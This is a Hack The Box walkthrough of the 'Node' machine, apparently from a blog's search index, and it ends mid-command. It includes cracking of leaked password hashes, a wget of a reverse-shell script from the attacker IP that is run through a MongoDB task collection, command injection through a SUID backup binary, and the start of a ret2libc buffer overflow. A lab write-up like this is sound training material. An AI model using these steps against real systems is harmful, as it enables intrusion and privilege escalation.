9359e905a2c35f861f6a57cecf28bb7b\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\n\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nIIS 6.0 Reverse Shell: https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269"
  },
  {
    "objectID": "posts/2021-03-11-htb-writeup-node/2021-03-11-htb-writeup-node.html",
    "href": "posts/2021-03-11-htb-writeup-node/2021-03-11-htb-writeup-node.html",
    "title": "Node - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[p3:/git/htb/node]$ nmap -Pn -n -sCV 10.10.10.58 –open (master✱) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA) | 256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA) |_ 256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519) 3000/tcp open hadoop-tasktracker Apache Hadoop | hadoop-datanode-info: |_ Logs: /login | hadoop-tasktracker-info: |_ Logs: /login |_http-title: MyPlace Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nWe find a login portal, not susceptible to SQLi. Looking through the debugger we find a lot of .js files; admin.js, home.js, login.js, profile.js, app.js\n\nIn app.js we find a few interesting paths; var controllers = angular.module(‘controllers’, []); var app = angular.module(‘myplace’, [ ‘ngRoute’, ‘controllers’ ]);\napp.config(function ($routeProvider, $locationProvider) { $routeProvider. when(‘/’, { templateUrl: ‘/partials/home.html’, controller: ‘HomeCtrl’ }). when(‘/profiles/:username’, { templateUrl: ‘/partials/profile.html’, controller: ‘ProfileCtrl’ }). when(‘/login’, { templateUrl: ‘/partials/login.html’, controller: ‘LoginCtrl’ }). when(‘/admin’, { templateUrl: ‘/partials/admin.html’, controller: ‘AdminCtrl’ }). otherwise({ redirectTo: ‘/’ });\n  $locationProvider.html5Mode(true);\n});\nIf we look further on /partials/admin.html we see that admins have the option to Download Backup.\ngit/htb/node]$ curl http://10.10.10.58:3000/partials/admin.html (master✱) — snip —\n\nOnly admin users have access to the control panel currently, but check back soon to test the standard user functionality!\n\n&lt;/div&gt;\n&lt;div ng-if=\"user.is_admin\"&gt;\n  &lt;button class=\"btn btn-large btn-primary\" ng-click=\"backup()\"&gt;Download Backup&lt;/button&gt;\n— snip —\nIn profile.js we find the line ‘$http.get(’/api/users/’ + $routeParams.username)’, curl /api/users to see if we can extract anything.\n[p3:/git/htb/node]$ curl http://10.10.10.58:3000/api/users (master✱) [{“_id”:“59a7365b98aa325cc03ee51c”,“username”:“myP14ceAdm1nAcc0uNT”,“password”:“dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af”,“is_admin”:true}, {“_id”:“59a7368398aa325cc03ee51d”,“username”:“tom”,“password”:“f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240”,“is_admin”:false}, {“_id”:“59a7368e98aa325cc03ee51e”,“username”:“mark”,“password”:“de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73”,“is_admin”:false}, {“_id”:“59aa9781cced6f1d1490fce9”,“username”:“rastating”,“password”:“5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0”,“is_admin”:false}]\n\nCrack the hashes with hashcat / crackstation.net\n\n[p3:/git/htb/node]$ hashcat -a0 -m1400 hashes.txt /usr/share/wordlists/rockyou.txt — snip — f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake\nWe have three sets of creds; myP14ceAdm1nAcc0uNT:manchester (admin) tom:spongebob mark:snowflake\nLogin with the admin account, and download the backup file.\n[p3:/git/htb/node]$ strings myplace.backup| base64 –decode &gt; out [p3:/git/htb/node]$ file -b out (master✱) Zip archive data, at least v1.0 to extract [p3:/git/htb/node]$ sudo mv out out.zip\nThe zip file is password protected, trying the previous known passwords don’t work. To crack the zip file we use fcrackzip.\n[p3:/git/htb/node]$ fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt out.zip (master✱) ‘var/www/myplace/’ is not encrypted, skipping found file ‘var/www/myplace/package-lock.json’, (size cp/uc 4404/ 21264, flags 9, chk 0145) ‘var/www/myplace/node_modules/’ is not encrypted, skipping ‘var/www/myplace/node_modules/serve-static/’ is not encrypted, skipping found file ‘var/www/myplace/node_modules/serve-static/README.md’, (size cp/uc 2733/ 7508, flags 9, chk 1223) found file ‘var/www/myplace/node_modules/serve-static/index.js’, (size cp/uc 1640/ 4533, flags 9, chk b964) found file ‘var/www/myplace/node_modules/serve-static/LICENSE’, (size cp/uc 697/ 1189, flags 9, chk 1020) found file ‘var/www/myplace/node_modules/serve-static/HISTORY.md’, (size cp/uc 2625/ 8504, flags 9, chk 35bd) found file ‘var/www/myplace/node_modules/serve-static/package.json’, (size cp/uc 868/ 2175, flags 9, chk 0145) ‘var/www/myplace/node_modules/utils-merge/’ is not encrypted, skipping found file ‘var/www/myplace/node_modules/utils-merge/README.md’, (size cp/uc 344/ 634, flags 9, chk 9f17) found file ‘var/www/myplace/node_modules/utils-merge/index.js’, (size cp/uc 219/ 381, flags 9, chk 9e03) 8 file maximum reached, skipping further files\nPASSWORD FOUND!!!!: pw == magicword\n\nUnzip the backup file, with password ‘magicword’.\n\n[p3:/git/htb/node]$ sudo unzip -P magicword out.zip -d backup (master✱) Archive: out.zip\n[p3:…node/backup/var/www/myplace]$ cat app.js — snip — const url = ‘mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace’;\nWe find a new sets of (SSH) creds! mark:5AYRft73VtFpc84k\n\nOnce logged in as mark we don’t get user.txt. Looking in /home we find three users;\n\n\nfrank\nmark\ntom (got user.txt)\n\nWe see that port 27017 is running locally. Further investigating it shows it’s mongodb.\n[+] Active Ports [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:27017 0.0.0.0:* LISTEN -\nWe can extract the contents with ‘mongodump’ however we only find the users and hashes that we already had. mark@node:/dev/shm$ mongodump -d myplace -u mark -p 5AYRft73VtFpc84k 2021-03-10T20:31:02.004+0000 writing myplace.users to 2021-03-10T20:31:02.006+0000 done dumping myplace.users (4 documents)\nAfter being stuck here for a good while, i noticed that user Tom runs two services; mark@node:/dev/shm/dump/scheduler$ ps aux | grep tom tom 1230 0.0 5.2 1008568 39940 ? Ssl 17:07 0:03 /usr/bin/node /var/scheduler/app.js tom 1236 0.0 6.4 1028912 48780 ? Ssl 17:07 0:07 /usr/bin/node /var/www/myplace/app.js\n/var/www/myplace/app.js we already know about, it was here we got our creds, but /var/scheduler/app.js is new.\nmark@node:/dev/shm/dump/scheduler$ cat /var/scheduler/app.js — snip — const url = ‘mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler’;\nWe find a new database, scheduler.\n\nExploit the mongo service.\n\nWith the ‘insert’-commands (insert, insertOne, insertMany) we can insert a file to be processed by the database. The means that we can upload a reverse shell, and execute it as user tom (as he is running the mongo service).\nmark@node:/dev/shm$ wget http://10.10.14.11:8888/rev.js\nmark@node:/dev/shm$ mongo scheduler -u mark -p 5AYRft73VtFpc84k MongoDB shell version: 3.2.16 connecting to: scheduler &gt; show collections tasks &gt; db.tasks.insertOne({cmd:“/usr/bin/node /dev/shm/rev.js”}); { “acknowledged” : true, “insertedId” : ObjectId(“604b3e15d2e31be023d70272”) }\n[p3:/git/htb/solidstate]$ nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.11] from (UNKNOWN) [10.10.10.58] 44652 id uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin) cat ~/user.txt e1156acc3574e04b06908ecf76be91b1\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nAs we saw from our ‘id’-command, we are a part of the groups ‘adm’ and ‘sudo’ - so as usual we run ‘sudo -l’.\n\ntom@node:/dev/shm$ sudo -l [sudo] password for tom:\nWe don’t know tom’s password, so this is a dead end. Upload and run linpeas.sh to find another attack vector.\n====================================( Interesting Files )===================================== [+] SUID - Check easy privesc, exploits and write perms [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid — snip — -rwsr-xr– 1 root admin 17K Sep 3 2017 /usr/local/bin/backup — It looks like /usr/local/bin/backup is executing /etc and you can impersonate it (strings line: /etc) (https://tinyurl.com/suidpath) — It looks like /usr/local/bin/backup is executing /root and you can impersonate it (strings line: /root) (https://tinyurl.com/suidpath) — It looks like /usr/local/bin/backup is executing time and you can impersonate it (strings line: time) (https://tinyurl.com/suidpath) — Trying to execute /usr/local/bin/backup with strace in order to look for hijackable libraries…\n/usr/local/bin/backup is owned by root, and group admin. If we run the binary, nothing happens (that we can see). Running strings on the file gives us a clue on what’s going on.\ntom@node:~$ strings /usr/local/bin/backup — snip — ____________________________________________________ /\n| _____________________________________________ | | | | | | | Secure Backup v1.0 | | | |_____________________________________________| | | | _____________________________________________________/ _______________________________________/ _______________________________________________ -’ .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-. — -_             _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.- -‘.-.-.-. .—.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-__. .-.-.-.-_        _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.- -’.-.-.-.-.-. .—.-. .—————————–. .-.—. .—.-.-.-.-_     :-----------------------------------------------------------------------------:—..—————————————————————–._.—’ Could not open file Validated access token Ah-ah-ah! You didn’t say the magic word! Finished! Encoded backup is below: UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA== /root /etc /tmp/.backup_%i /usr/bin/zip -r -P magicword %s %s &gt; /dev/null /usr/bin/base64 -w0 %s The target path doesn’t exist ;*2$” GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609\nThe base64 code is just a trollface. We can’t really investigate the binary further, so transfer the file to your local machine.\n[p3:/git/htb/node]$ sudo nc -lp 4400 &gt; backup tom@node:/usr/local/bin$ nc -w 3 10.10.14.11 4400 &lt; backup\n\nIf I’m reading the code correct, the binary zips /root and /etc, password protects the zip and then throws it to /dev/null. Maybe we can Buffer overflow to grab the files before thrown away?\nTring when trying to execute the file we get no output at all. To understand how to use it, we must look back at /var/www/myplace/app.js;\n\ntom@node:/$ cat /var/www/myplace/app.js | grep backup const backup_key = ‘45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474’; — snip — var proc = spawn(‘/usr/local/bin/backup’, [‘-q’, backup_key, __dirname ]); — snip —\nFrom the code we find a key, and how to execute the binary. Lets try to backup /root/root.txt.\ntom@node:/dev/shm$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root/root.txt [+] Finished! Encoded backup is below:\nUEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==\nWe can see directly that the base64 is the same that we got from our strings, a trollface.\n\nInstead of using the directory name, we can use wildcard symbols to circumvent the trollface. tom@node:/dev/shm$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /rt/rt.txt UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWWiTS2B1eAsAAQQAAAAABAAAAABBCIGHDmC+vo6OEZe88xXpB8P2VOruMCMNUzPVliowYtBD5ucJ7jLiDVnjEqJQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA\n\nDecode the base64 and write it to a file, unzip with password ‘magicword’ and grab flag. [root:/git/htb/node]# unzip -P magicword root.zip (master✱) Archive: root.zip extracting: root/root.txt\n[root:/git/htb/node]# cat root/root.txt (master✱) 1722e99ca5f353b362556a62bd5e6be0\nBONUS: 1) Code injection tom@node:/usr/local/bin$ backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $‘/bin/sh echo OK’\nzip error: Nothing to do! (/tmp/.backup_287397083)\n# whoami root # cat /root/root.txt 1722e99ca5f353b362556a62bd5e6be0\n\nBypassing ‘/root’ blacklist by standing in / and just writing ‘root’ tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root |base64 -d &gt; tmp/root.zip tom@node:/$ cd tmp tom@node:/$ unzip -P magicword root.zip Archive: root.zip creating: root/ inflating: root/.profile inflating: root/.bash_history creating: root/.cache/ extracting: root/.cache/motd.legal-displayed extracting: root/root.txt inflating: root/.bashrc inflating: root/.viminfo creating: root/.nano/ extracting: root/.nano/search_history tom@node:/$ cat tmp/root/root.txt 1722e99ca5f353b362556a62bd5e6be0\n\nBONUS BUFFER OVERFLOW:\n\nTrying to execute ./backup locally gives us the error ’ [!] Could not open file’. If we investigate this with ltrace we can see that it tries to open /etc/myplace/keys.\n\n[root:/git/htb/node]# ltrace ./backup 1 2 3 — snip — fopen(“/etc/myplace/keys”, “r”) = 0 strcpy(0xffe4c358, “Could not open file”) = 0xffe4c358\nView the file on the victim, and copy it over to our local box. tom@node:/$ cat /etc/myplace/keys a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 [root:/git/htb/node]# mkdir /etc/myplace (master✱) [root:/git/htb/node]# vim /etc/myplace/keys\nNow if we try the binary (without the quite operator -q), we get something to work with. [root:/git/htb/node]# ./backup 1 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 testasdf — snip — [+] Validated access token [+] Starting archiving testis [!] The target path doesn’t exist\n\nCheck the security of the file.\n\n[root:/git/htb/node]# gdb ./backup\ngef➤ checksec [+] checksec for ‘/git/htb/node/backup’ Canary : ✘ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : Partial\nNext we need to find the point where the program craches. Start by creating a random length payload: gef➤ pattern create 550 [+] Generating a pattern of 550 bytes aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafma\nExecute the program with the payload: gef➤ r dennis 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafma — snip — $ebp : 0x66616163 (“caaf”?) — snip — ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0xffffc100│+0x0000: 0xffffd4b0 → “aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[…]” ← $esp — snip — ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: “backup”, stopped 0x616164 in ?? (), reason: SIGSEGV\nFrom the output ebp indicates where the program crached. We can quickly look up exactly where value “caaf” is: gef➤ pattern offset caaf [+] Searching ‘caaf’ [+] Found at offset 220 (little-endian search) likely [+] Found at offset 508 (big-endian search)\nThe offset is said to be 508. We can prove this by creating a new pattern of 508, followed by 4 specified characters and verify that they are set as esp value.\ngef➤ pattern create 508 [+] Generating a pattern of 508 bytes aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaa\ngef➤ r dennis 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafBBBB — snip — 0xffffbf84│+0x0000: “BBBB” ← $esp — snip — ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: “backup”, stopped 0xf7e5dd9d in ?? (), reason: SIGSEGV\nIt’s verified, the offset (or buffer size) is 508 byte.\n\nNext, find all addresses needed to form an exploit.\n\nList libraries loaded within the binary using “ldd”:\ntom@node:/usr/local/bin$ ldd backup linux-gate.so.1 =&gt; (0xf7717000) libc.so.6 =&gt; /lib32/libc.so.6 (0xf7558000) /lib/ld-linux.so.2 (0xf7718000)\nLibc address: 0xf7558000\nNext, search for the system address within libc.so.6 using “readelf”: tom@node:/dev/shm$ readelf -s /lib32/libc.so.6 | grep system readelf -s /lib32/libc.so.6 | grep system 245: 00110820 68 FUNC GLOBAL DEFAULT 13 svcerr_systemerr@@GLIBC_2.0 627: 0003a940 55 FUNC GLOBAL DEFAULT 13 __libc_system@@GLIBC_PRIVATE 1457: 0003a940 55 FUNC WEAK DEFAULT 13 system@@GLIBC_2.0\nSystem address: 0003a940\nSearch to see if there’s an exit instruction: tom@node:/dev/shm$ readelf -s /lib32/libc.so.6 | grep exit 112: 0002eba0 39 FUNC GLOBAL DEFAULT 13 __cxa_at_quick_exit@@GLIBC_2.10 141: 0002e7b0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0 450: 0002ebd0 181 FUNC GLOBAL DEFAULT 13 __cxa_thread_atexit_impl@@GLIBC_2.18 558: 000af578 24 FUNC GLOBAL DEFAULT 13 _exit@@GLIBC_2.0 616: 00113840 56 FUNC GLOBAL DEFAULT 13 svc_exit@@GLIBC_2.0 652: 0002eb80 31 FUNC GLOBAL DEFAULT 13 quick_exit@@GLIBC_2.10 876: 0002e9d0 85 FUNC GLOBAL DEFAULT 13 __cxa_atexit@@GLIBC_2.1.3 1046: 0011d290 52 FUNC GLOBAL DEFAULT 13 atexit@GLIBC_2.0 1394: 001b0204 4 OBJECT GLOBAL DEFAULT 32 argp_err_exit_status@@GLIBC_2.1 1506: 000f19a0 58 FUNC GLOBAL DEFAULT 13 pthread_exit@@GLIBC_2.0 2108: 001b0154 4 OBJECT GLOBAL DEFAULT 32 obstack_exit_failure@@GLIBC_2.0 2263: 0002e7d0 78 FUNC WEAK DEFAULT 13 on_exit@@GLIBC_2.0 2406: 000f2db0 2 FUNC GLOBAL DEFAULT 13 __cyg_profile_func_exit@@GLIBC_2.2\nExit address: 0002e7b0\nNext we need to find any instruction for executing a command, like “bash,sh etc…”, we do this using strings: tom@node:/dev/shm$ strings 